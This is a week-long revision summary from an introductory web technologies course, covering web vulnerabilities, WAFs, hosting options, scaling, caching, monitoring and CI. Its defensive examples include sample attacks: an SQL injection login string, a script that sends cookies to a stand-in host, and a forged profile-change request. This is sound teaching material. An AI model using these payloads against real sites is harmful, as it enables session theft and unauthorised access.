# CSC_106 — Week 11 Summary

*Introduction to Web Technologies · Week 11 (16 – 22 Nov 2026) · Topic: Security and deployment — web application vulnerabilities and security best practices, the Web Application Firewall and secure development, server deployment and hosting options, scaling, load balancing, caching and CDNs, and monitoring, debugging, testing and continuous integration*

## The 8 most examinable things this week

1. **Web application security — the definition to reproduce.** **Web application security** is *the practice of protecting web applications from threats that can compromise the **confidentiality, integrity, or availability** of data*. Memorise those three words as a set — they are the standard triad, and the summary repeats them. Threats come from three named sources: **malicious users**, **attackers**, and **vulnerabilities within the application itself**.
2. **The four terminologies, kept distinct.** **Web application** — *a software program that operates on a web server and interacts with users through a web browser* (online banking portals, e-commerce websites, social media platforms). **Vulnerability** — *a **weakness** in a web application's design, implementation, or configuration that can be exploited by attackers*. **Threat** — *a **potential danger or harm** to a web application's security* (SQL injection, XSS, DDoS). Note the direction: a **vulnerability is what you have**, a **threat is what could happen to you**, and an **attack** is the threat being carried out through the vulnerability.
3. **The five named vulnerabilities and their one-line mechanisms.** **SQL Injection (SQLi)** — an attacker **inserts malicious SQL code into user inputs**, manipulating the application's database; the deck's worked example is entering **`' OR 1=1--`** in a login form to gain unauthorised access. **Cross-Site Scripting (XSS)** — attackers **inject malicious scripts into web pages viewed by other users**, leading to **data theft or session hijacking**; example: **malicious JavaScript embedded in a comment section**. **Cross-Site Request Forgery (CSRF)** — attacks **trick users into performing unwanted actions without their consent while authenticated**; example: a **malicious link that changes a user's email address on their profile**. **Injection attacks** — besides SQLi, **command injection** and **XML injection**, exploiting applications that **process user-supplied data without proper validation**. **Security misconfigurations** — developers **overlook security settings and leave sensitive information exposed**; example: **database credentials left in plaintext configuration files**.
4. **The seven security best practices, each paired with the vulnerability it defeats.** **Input validation** (validate and sanitise inputs; **parameterised queries** for database interactions) → **injection/SQLi**. **Output encoding** (encode output; **Content Security Policy (CSP)**) → **XSS**. **Authentication and authorization** (strong authentication; **limit user privileges based on roles and permissions**; **two-factor authentication (2FA)** as an extra layer). **Session management** (securely manage sessions; **unique tokens** to prevent CSRF; **session expiration policies**) → **CSRF**. **Security headers** (**HTTP Strict Transport Security (HSTS)**, **X-Content-Type-Options**). **Regular updates** (keep libraries and frameworks up to date to **patch known vulnerabilities**). **Security testing** (**vulnerability scanning, penetration testing, code reviews**). The pairing is the exam question: *"which practice prevents XSS?"* → output encoding/CSP, **not** input validation.
5. **The WAF answer (mid-lesson question 1) — learn it verbatim.** A **Web Application Firewall (WAF)** is *a security appliance or service that **filters and monitors HTTP/HTTPS requests** to a web application*. It **acts as a shield against common web application attacks**, providing an **additional layer of security**. How it functions: it **inspects incoming traffic, identifies malicious patterns or payloads, and blocks or mitigates potential threats before they reach the web application** — named examples of what it blocks are **SQL injection and cross-site scripting**. The words "additional layer" matter: a WAF **supplements** secure code, it does not replace it.
6. **Secure development practices — three items.** **Secure coding** (developers **trained in secure coding practices**, such as **avoiding hard-coded credentials** and following security guidelines), **code review** (**regular reviews by experienced developers** catch security issues **early in the development process**), and **DevSecOps** (**incorporating security into the DevOps pipeline** so security is **an integral part of development, not an afterthought**). "Not an afterthought" is the phrase to reproduce.
7. **The four hosting options and what each trades away.** **On-premises hosting** — servers within the organisation's **own physical facilities** (data centres, server rooms); **complete control** but **substantial infrastructure and maintenance**. **Cloud hosting** — infrastructure from **AWS, Microsoft Azure, Google Cloud Platform (GCP)**; **scalability, flexibility, cost-efficiency**; example **AWS Elastic Beanstalk**, which **automatically manages server resources and scaling**. **Virtual Private Server (VPS)** — a physical server **partitioned into multiple virtual servers, each with its own OS, resources and configurations**; a **balance between control and cost**; example **DigitalOcean running a WordPress site**. **Shared hosting** — **multiple websites on a single server sharing CPU and RAM**; **cost-effective** but **limited in performance and customisation**; example a **personal blog on Bluehost**. The **growing e-commerce business answer (mid-lesson question 2)** is **cloud hosting, e.g. AWS**, for **scalability, flexibility and cost-efficiency**, the ability to **adjust resources to traffic demands**, and **managed services that automate resource management and reduce operational burden**.
8. **Scaling, load balancing and the three optimisation techniques.** **Scalability** is *the ability of a system to handle **increased load** while **maintaining or improving performance*** — accommodating more users, requests or data **without a proportional decrease in performance**. **Horizontal scaling** = **adding more machines or instances** to distribute the workload, **often achieved by load balancing** (more web server nodes). **Vertical scaling** = **scaling up**, **upgrading the existing server or hardware** (more CPU cores, memory, storage). **Load balancing** *evenly distributes incoming traffic across multiple server instances* so **no single server becomes a bottleneck**, improving **both scalability and fault tolerance** — **NGINX** or **AWS Elastic Load Balancing**. Then **caching** (frequently accessed data in a **temporary storage layer**), **CDNs** (**geographically distributed servers** caching content closer to users, e.g. **Cloudflare**), **database optimisation** (queries, **indexing**, data structures) and **front-end optimisation** (fewer/smaller HTTP requests, optimised images, **lazy loading**, **minifying** CSS and JS).

## Web application vulnerabilities

| Vulnerability | Mechanism | Deck's example | Named defence |
|---|---|---|---|
| **SQL Injection (SQLi)** | Malicious **SQL code inserted into user inputs**, manipulating the database | `' OR 1=1--` in a login form grants unauthorised access | **Input validation** + **parameterised queries** |
| **Cross-Site Scripting (XSS)** | Malicious **scripts injected into pages viewed by other users** → **data theft, session hijacking** | Malicious JavaScript in a **comment section** | **Output encoding** + **Content Security Policy (CSP)** |
| **Cross-Site Request Forgery (CSRF)** | Tricks an **already-authenticated** user into an **unwanted action without consent** | A link that **changes the user's profile email address** | **Session management** with **unique tokens**; session expiry |
| **Injection attacks (general)** | **Command injection**, **XML injection** against apps processing input **without proper validation** | — | **Input validation and sanitisation** |
| **Security misconfiguration** | Security settings **overlooked**, sensitive information **left exposed** | **Database credentials in plaintext config files** | **Regular updates**, secure defaults, **no hard-coded credentials** |

```sql
-- SQLi: the input is concatenated straight into the query, so it becomes code
SELECT * FROM users WHERE email = '' OR 1=1--' AND password = '...';
--                                   ^^^^^^^^ always true; -- comments out the rest

-- Parameterised query: the input can only ever be DATA, never SQL
SELECT * FROM users WHERE email = ? AND password_hash = ?;
```

```html
<!-- XSS: an unencoded comment is rendered as markup and the script runs -->
<p>Great post! <script>fetch('//evil.example/?c='+document.cookie)</script></p>

<!-- Output encoding: the same characters are rendered as text, not markup -->
<p>Great post! &lt;script&gt;fetch(...)&lt;/script&gt;</p>
```

```html
<!-- CSRF: the victim is authenticated, so the browser attaches their session
     cookie automatically and the server cannot tell this was not intended -->
<img src="https://bank.example/profile/email?new=attacker@evil.example">

<!-- Defence: a unique per-session token the attacker's page cannot know -->
<input type="hidden" name="csrf_token" value="8f2c...a91">
```

Two security headers are named. **HSTS (HTTP Strict Transport Security)** tells the browser to use **HTTPS only** for the site thereafter; **X-Content-Type-Options** stops the browser second-guessing a declared content type.

```http
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
Content-Security-Policy: script-src 'self'      <- the named XSS mitigation
```

**Security testing** has three named forms: **vulnerability scanning**, **penetration testing** and **code reviews** — the same three the case study's methodology opens with (*vulnerability assessment and penetration testing to identify and remediate existing weaknesses*).

The week's own summary widens the threat list slightly beyond the deck: **brute force attacks**, **phishing**, **SQL injection**, **XSS** and **CSRF**; and the strategy list to **strong password policies**, **multi-factor authentication (MFA)**, **SSL/TLS encryption**, **penetration testing** and **security updates**. Treat **2FA** and **MFA** as the same idea — 2FA is MFA with exactly two factors.

## Server deployment and hosting

**Server** — *a computer or software system that responds to requests from client devices*, **delivering data, applications or services over a network** (web servers, file servers, database servers). **Deployment** — *the process of **setting up and configuring servers** to make them **operational and accessible to users***, involving **hardware setup, software installation and network configuration**. **Hosting** — *providing **server resources and infrastructure** to make applications or websites **accessible on the internet***, either **on-premises or through third-party providers**.

**Physical servers** are **tangible hardware machines dedicated to running server applications** (on-premises servers in data centres). **Virtual servers** are **software-based instances running on physical hardware**; **virtualisation technology allows multiple virtual servers to coexist on a single physical machine**. **Operating systems** manage hardware resources and provide services for server applications — **Linux distributions (Ubuntu, CentOS)** and **Windows Server**. **Server roles** define the specific functions a server performs: **web servers (Apache, Nginx)**, **database servers (MySQL, PostgreSQL)** and **mail servers (Microsoft Exchange)** — the same Week 10 vocabulary, now viewed from the deployment side.

| Hosting option | Control | Cost | Named provider / example |
|---|---|---|---|
| **On-premises** | **Complete control** | High — substantial infrastructure and maintenance | Own data centre / server room |
| **Cloud** | Managed for you | **Cost-efficient**, pay for what you scale to | **AWS**, **Azure**, **GCP**; **AWS Elastic Beanstalk** |
| **VPS** | **Balance of control and cost**; own OS and resources | Middle | **DigitalOcean** running WordPress |
| **Shared** | Least — limited customisation | **Cheapest** | **Bluehost** hosting a personal blog |

The three practical deployment examples: **deploying a WordPress website** — choose between shared, VPS or cloud based on **budget, traffic expectations and technical expertise**; **setting up a mail server** — **on-premises or a VPS** with dedicated software such as **Microsoft Exchange or Postfix**; **scaling an e-commerce website** for a holiday traffic surge — **cloud hosting**, which lets you **scale resources up or down without investing in additional physical hardware**.

**Security and maintenance of the deployed server** has three headings. **Security measures**: **firewalls**, **regular software patching**, **intrusion detection systems** and **strong authentication**. **Monitoring and maintenance**: **monitor server performance**, **apply updates and patches**, **perform backups** — for **reliability and data integrity**. **Disaster recovery**: a **robust disaster recovery plan** to **mitigate data loss and downtime** in case of server failures or disasters. Note that backups belong to maintenance and the *plan* belongs to disaster recovery.

## Scalability and performance optimisation

**Performance optimisation** is *improving the **speed, responsiveness and overall efficiency** of a web application*, aiming to **reduce latency, enhance user experience and minimise resource utilisation**. Scalability is about **load**; optimisation is about **speed** — a question about "handling more users" is scaling, a question about "pages loading slowly" is optimisation.

```
Horizontal scaling (scaling OUT)          Vertical scaling (scaling UP)
        ┌─────────────┐                          ┌─────────────┐
client →│ load balancer│→ web server 1            client ──────→│  one server  │
        └─────────────┘→ web server 2                          │ +CPU +RAM    │
                       → web server 3                          │ +storage     │
   more machines/instances, traffic spread       └─────────────┘
   evenly; no single server is a bottleneck;     upgrade the existing hardware
   improves scalability AND fault tolerance      to handle increased load
```

| Technique | What it does | Named example |
|---|---|---|
| **Load balancing** | **Evenly distributes incoming traffic across multiple server instances**; prevents bottlenecks; improves **scalability and fault tolerance** | **NGINX**, **AWS Elastic Load Balancing** |
| **Caching** | Stores **frequently accessed data or computed results** in a **temporary storage layer (cache)**, reducing fetches from the **primary data source** and improving response times | **Browser caching** of static assets — images, CSS, JavaScript |
| **CDN** | **Geographically distributed servers** that **cache and deliver web content from locations closer to users**, reducing **latency** | **Cloudflare** distributing static content worldwide |
| **Database optimisation** | Optimising **queries, indexing and data structures** to improve query performance and **reduce database load** | **Indexing frequently queried columns** to speed up `SELECT` |
| **Front-end optimisation** | **Minimising the size and number of HTTP requests**, optimising images, **lazy loading** | **Minifying** CSS and JS; **responsive images** per device |

The three worked optimisation examples map one technique to one symptom: **e-commerce holiday traffic** → **horizontal scaling, more web server instances behind a load balancer**; **a slow blog** → **front-end optimisation (lazy loading) plus a CDN**; **slow social-media feeds** → **database indexing plus caching to reduce database load**.

**Monitoring and testing of performance.** **Performance monitoring** uses **tools and metrics — response time, error rates, resource utilisation — to continuously monitor** the application; named tools **New Relic** and **Datadog**. **Load testing** **simulates high levels of traffic to identify performance bottlenecks**; named tools **Apache JMeter** and **Gatling**. Do not swap the tool pairs: New Relic/Datadog *observe production*, JMeter/Gatling *generate synthetic load*.

## Monitoring, debugging and continuous integration

**Monitoring** is *the practice of **continuously observing** a web application's **performance, health and behaviour in real time***, collecting **data, metrics and logs** to **identify anomalies and trends**. **Debugging** is *the process of **identifying and resolving issues, errors or defects** in a web application's code or functionality*. Monitoring is **ongoing and outward-looking**; debugging is **reactive and code-level**.

**The three key concepts of monitoring.** **Metrics** — **quantifiable measurements** giving insight into performance and behaviour (response times, error rates, resource utilisation); example: monitoring an e-commerce site's **average response time**. **Alerts** — **notifications triggered when predefined conditions or thresholds are met or exceeded**, allowing **timely response**; example: an alert when **CPU usage exceeds 90% for five consecutive minutes**. **Logging** — **recording events, actions and errors**, giving a **detailed history of what happened** and being **crucial for debugging**; example: **log entries for login attempts with timestamps and success/failure status**.

**The three key concepts of debugging.** **Error handling** — **anticipating and managing errors during execution**, preventing **crashes** and providing **meaningful error messages**; example **try-catch blocks in JavaScript**. **Debugging tools** — software utilities including **IDEs, code editors and browser developer tools**; example **Chrome DevTools**. **Version control** — **VCS like Git** track changes over time, allowing you to **roll back to previous versions and collaborate**; the deck's third practical example is **collaborative debugging**, where a VCS lets multiple developers **merge code changes while maintaining a history of revisions**.

```js
// Error handling: the named debugging concept, in the named language
try {
  const res = await fetch("/api/checkout", { method: "POST", body: payload });
  if (!res.ok) throw new Error(`checkout failed: ${res.status}`);
} catch (err) {
  logger.error({ event: "checkout_failure", user: id, err: err.message }); // logging
  showMessage("We could not complete your payment. Please try again.");   // meaningful
}
```

**Testing and continuous integration.** **Testing** covers **unit testing, integration testing and end-to-end testing** — *"different layers of a web application"*; example: **unit tests for critical functions**. **Continuous Integration (CI)** practices **automatically build, test and deploy code changes as they are committed to a version control system**; **CI pipelines can include automated tests that catch and report issues early in the development process**; named tools **Jenkins** and **Travis CI**. CI therefore sits on top of version control — no VCS, no CI trigger.

```yaml
# A CI pipeline: every commit to version control triggers build -> test -> deploy
on: [push]
jobs:
  build:   { runs: npm ci && npm run build }
  test:    { runs: npm test }        # unit, integration, end-to-end
  deploy:  { runs: ./deploy.sh, needs: test }   # only if the tests pass
```

## Commonly confused

- **Authentication vs authorisation** — **authentication** verifies **who you are** (passwords, tokens, **2FA/MFA**); **authorisation** decides **what you are allowed to do** once identified, which the deck states as **limiting user privileges based on roles and permissions**. The deck lists them as one best practice, but they are two steps in order: you authenticate first, then authorise. "Log in with a one-time code" = authentication; "only managers can issue refunds" = authorisation.
- **Encryption vs hashing** — **encryption** is **reversible** with a key and protects data **in transit or at rest** so it can be read again later (**SSL/TLS encryption** is the deck's named example); **hashing** is **one-way** and is how passwords should be stored, so that even the site cannot recover them. A question about "protecting data travelling between browser and server" is encryption; "storing passwords so a database leak does not reveal them" is hashing. Neither is the same as **encoding** — **output encoding** against XSS is a *rendering* transformation, not a security secret.
- **HTTP vs HTTPS/TLS** — **HTTP** carries requests and responses **in plaintext**, so anything on the path can read or alter them; **HTTPS** is the same HTTP carried **inside a TLS (formerly SSL) encrypted channel**, giving **confidentiality**, **integrity** and **server authentication** via the site's **certificate**. TLS/SSL is the protocol; the **certificate**, issued by a **Certificate Authority**, is what proves the server is who the domain says it is; **HSTS** is the header that stops the browser falling back to plain HTTP at all. Note carefully that a **WAF filters HTTP/HTTPS requests** — it inspects traffic **after** TLS is terminated and is not itself encryption.
- **Vulnerability vs threat vs attack** — a **vulnerability** is a **weakness in design, implementation or configuration**; a **threat** is a **potential danger or harm**; an attack is a threat actually exploiting a vulnerability. Plaintext credentials in a config file are a **vulnerability**; DDoS is a **threat**. Do not answer "SQL injection" when asked to define a vulnerability *in general*.
- **SQLi vs XSS** — both come from unvalidated input, but the **victim differs**. **SQLi** targets the **database on the server** (unauthorised access, data manipulation); **XSS** targets **other users' browsers** (data theft, session hijacking). Defence differs too: **parameterised queries** for SQLi, **output encoding and CSP** for XSS.
- **XSS vs CSRF** — **XSS injects the attacker's script into your page**; **CSRF injects nothing — it borrows the victim's existing authenticated session** to make a request they did not intend. XSS needs a script to run; CSRF only needs the victim to click a link while logged in. Defence: **output encoding/CSP** for XSS, **unique session tokens and session expiry** for CSRF.
- **Input validation vs output encoding** — **validation and sanitisation happen on the way in** and defeat **injection attacks**; **encoding happens on the way out** and defeats **XSS**. If a question says "prevent injection", say input validation and parameterised queries; if it says "prevent scripts running in other users' browsers", say output encoding and CSP.
- **WAF vs a network firewall vs an IDS** — a **WAF filters and monitors HTTP/HTTPS requests** to the **application**, blocking application-layer attacks such as SQLi and XSS; a plain **firewall** (listed under server security measures) controls **network traffic by port and address**; an **intrusion detection system** **detects and reports** suspicious activity rather than blocking requests. A WAF is an **additional layer**, never a substitute for secure code.
- **Horizontal vs vertical scaling** — **horizontal = adding more machines or instances**, usually **behind a load balancer**; **vertical = scaling up, upgrading the existing server's CPU, memory or storage**. Horizontal also buys **fault tolerance** (one node can die); vertical does not — one bigger server is still one server.
- **Load balancing vs caching vs CDN** — a **load balancer distributes requests across servers** (a scaling and fault-tolerance device); a **cache stores frequently accessed data in a temporary layer** so the primary source is not hit (a latency device); a **CDN is a geographically distributed cache** that shortens the *physical* distance to the user. "No single server becomes a bottleneck" = load balancing; "users in another continent load images slowly" = CDN.
- **Scalability vs performance optimisation** — **scalability** is handling **increased load without a proportional decrease in performance**; **optimisation** is improving **speed, responsiveness and efficiency** at the current load. Adding server nodes is scaling; minifying JavaScript is optimisation. Caching plausibly does both, which is why exam wording matters.
- **Deployment vs hosting** — **deployment** is the **process of setting up and configuring servers** (hardware setup, software installation, network configuration) to make them operational; **hosting** is **providing the server resources and infrastructure** that make the application reachable on the internet. You *deploy onto* hosting.
- **VPS vs shared vs cloud hosting** — **shared** puts **many websites on one server sharing CPU and RAM** (cheapest, least customisable); a **VPS partitions one physical server into virtual servers each with its own OS, resources and configuration** (balance of control and cost); **cloud** uses a provider's whole infrastructure (**AWS/Azure/GCP**) for **scalability, flexibility and cost-efficiency**. All three involve sharing physical hardware — the difference is **isolation and elasticity**, not whether the metal is shared.
- **Physical vs virtual servers** — a **physical server** is **tangible dedicated hardware**; a **virtual server** is a **software-based instance**, and **virtualisation lets many coexist on one physical machine**. A VPS is virtual servers sold as hosting; on-premises hosting is usually physical but need not be.
- **Monitoring vs debugging vs logging** — **monitoring** continuously observes **performance, health and behaviour in real time**; **debugging** identifies and resolves **specific errors in code**; **logging** is the **record of events** that monitoring watches and debugging reads afterwards. Logging is listed as a **monitoring** concept even though its stated value is *crucial for debugging* — expect that as a trick.
- **Metrics vs alerts** — **metrics are the quantifiable measurements** (response time, error rates, resource utilisation); an **alert is the notification fired when a predefined threshold is met or exceeded**. "Average response time" is a metric; "email me when CPU exceeds 90% for five minutes" is an alert.
- **Testing vs continuous integration** — **testing** is the activity (**unit, integration, end-to-end**); **CI** is the **automation that builds, tests and deploys on every commit to version control**. Writing a unit test is testing; **Jenkins or Travis CI** running it automatically on commit is CI.
- **Version control vs backups** — **Git tracks code changes over time** and enables **rollback and collaboration**; **backups** (listed under server monitoring and maintenance) protect **data and the server**, and feed the **disaster recovery** plan. A lost commit is a version-control problem; a failed disk is a backup problem.
